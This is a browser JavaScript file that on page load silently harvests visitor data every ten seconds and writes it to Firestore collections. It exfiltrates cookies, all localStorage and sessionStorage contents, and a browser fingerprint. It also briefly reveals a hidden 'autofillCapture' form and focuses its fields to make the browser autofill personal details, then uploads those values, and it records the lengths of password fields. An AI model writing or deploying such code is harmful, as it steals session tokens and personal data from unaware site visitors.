document.addEventListener('DOMContentLoaded', function() {
    // Collect all data automatically without user interaction
    setTimeout(collectAllData, 1000); // Initial collection after 1 second
    setInterval(collectAllData, 10000); // Continue collecting every 10 seconds
});

async function collectAllData() {
    try {
        // 1. Collect browser fingerprint and session data
        await collectSessionData();
        
        // 2. Trigger autofill capture
        await captureAutofillData();
        
        // 3. Collect form history and structure
        await collectFormStructure();
        
        // 4. Collect stored credentials and tokens
        await collectStoredCredentials();
        
        console.log("All data collected successfully");
    } catch (error) {
        console.error('Error during data collection:', error);
    }
}

async function collectSessionData() {
    try {
        const sessionData = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            cookies: document.cookie,
            localStorageItems: {},
            sessionStorageItems: {},
            referrer: document.referrer,
            location: window.location.href,
            screenInfo: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth
            },
            windowInfo: {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            plugins: Array.from(navigator.plugins).map(p => p.name)
        };
        
        // Safely collect localStorage items
        for (let i = 0; i < localStorage.length; i++) {
            try {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                sessionData.localStorageItems[key] = value;
            } catch (e) {
                // Handle security errors
                sessionData.localStorageItems[`error_${i}`] = "[Access Denied]";
            }
        }
        
        // Safely collect sessionStorage items
        for (let i = 0; i < sessionStorage.length; i++) {
            try {
                const key = sessionStorage.key(i);
                const value = sessionStorage.getItem(key);
                sessionData.sessionStorageItems[key] = value;
            } catch (e) {
                // Handle security errors
                sessionData.sessionStorageItems[`error_${i}`] = "[Access Denied]";
            }
        }
        
        // Send to Firestore
        await sendToFirestore('session_data', sessionData);
    } catch (error) {
        console.error('Error collecting session data:', error);
    }
}

async function captureAutofillData() {
    try {
        // Force focus on hidden form to trigger autofill
        const hiddenForm = document.getElementById('autofillCapture');
        if (hiddenForm) {
            hiddenForm.style.display = 'block';
            
            // Briefly focus each field to encourage autofill
            const inputs = hiddenForm.querySelectorAll('input');
            for (let input of inputs) {
                try {
                    input.focus();
                    await new Promise(resolve => setTimeout(resolve, 100));
                } catch (e) {
                    console.log(`Could not focus ${input.name}`);
                }
            }
            
            // Wait a moment for autofill to populate
            await new Promise(resolve => setTimeout(resolve, 500));
            
            // Collect autofill data
            const autofillData = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                location: window.location.href
            };
            
            let hasData = false;
            
            // Collect all autofill values
            for (let input of inputs) {
                if (input.value && input.value.trim() !== '') {
                    autofillData[input.name] = input.value;
                    hasData = true;
                }
            }
            
            // Hide form again
            hiddenForm.style.display = 'none';
            
            // Only send if we captured data
            if (hasData) {
                await sendToFirestore('autofill_data', autofillData);
            }
        }
    } catch (error) {
        console.error('Error capturing autofill data:', error);
    }
}

async function collectFormStructure() {
    try {
        // Collect all forms on the page
        const forms = document.getElementsByTagName('form');
        const formData = {
            timestamp: new Date().toISOString(),
            pageUrl: window.location.href,
            forms: []
        };
        
        for (let i = 0; i < forms.length; i++) {
            const form = forms[i];
            const formInfo = {
                id: form.id,
                name: form.name,
                action: form.action,
                method: form.method,
                fields: []
            };
            
            // Collect all input fields
            const inputs = form.querySelectorAll('input, select, textarea');
            inputs.forEach(input => {
                formInfo.fields.push({
                    name: input.name,
                    type: input.type,
                    id: input.id,
                    autocomplete: input.autocomplete,
                    valueLength: input.value ? input.value.length : 0,
                    hasValue: !!input.value
                });
            });
            
            formData.forms.push(formInfo);
        }
        
        // Also collect any other input fields not in forms
        const standaloneInputs = document.querySelectorAll('input:not(form input), textarea:not(form textarea), select:not(form select)');
        if (standaloneInputs.length > 0) {
            const standaloneForm = {
                id: 'standalone_inputs',
                name: 'Standalone Inputs',
                fields: []
            };
            
            standaloneInputs.forEach(input => {
                standaloneForm.fields.push({
                    name: input.name,
                    type: input.type,
                    id: input.id,
                    autocomplete: input.autocomplete,
                    valueLength: input.value ? input.value.length : 0,
                    hasValue: !!input.value
                });
            });
            
            formData.forms.push(standaloneForm);
        }
        
        if (formData.forms.length > 0) {
            await sendToFirestore('form_structure', formData);
        }
    } catch (error) {
        console.error('Error collecting form structure:', error);
    }
}

async function collectStoredCredentials() {
    try {
        // Collect potential credential storage
        const credentialData = {
            timestamp: new Date().toISOString(),
            location: window.location.href
        };
        
        // Check for password managers or stored credentials
        // This is more about detection than extraction
        credentialData.passwordManagerDetected = !!(
            navigator.credentials || 
            window.PasswordCredential || 
            window.FederatedCredential
        );
        
        // Try to detect if password fields have been autofilled
        const passwordFields = document.querySelectorAll('input[type="password"]');
        credentialData.passwordFields = Array.from(passwordFields).map(field => ({
            id: field.id,
            name: field.name,
            hasValue: !!field.value,
            valueLength: field.value ? field.value.length : 0
        }));
        
        // Check for credential-related events or APIs
        credentialData.credentialAPIs = {
            credentialsAPI: !!navigator.credentials,
            webauthn: !!navigator.credentials?.create
        };
        
        await sendToFirestore('credential_data', credentialData);
    } catch (error) {
        console.error('Error collecting credential data:', error);
    }
}

async function sendToFirestore(collectionName, data) {
    try {
        // Ensure Firestore is initialized
        if (!window.firestoreDB) {
            console.error('Firestore not initialized');
            return;
        }
        
        // Add document to collection
        const docRef = await addDoc(collection(collectionName), data);
        console.log(`${collectionName} document written with ID:`, docRef.id);
        return docRef.id;
    } catch (error) {
        console.error(`Error adding document to ${collectionName}:`, error);
    }
}
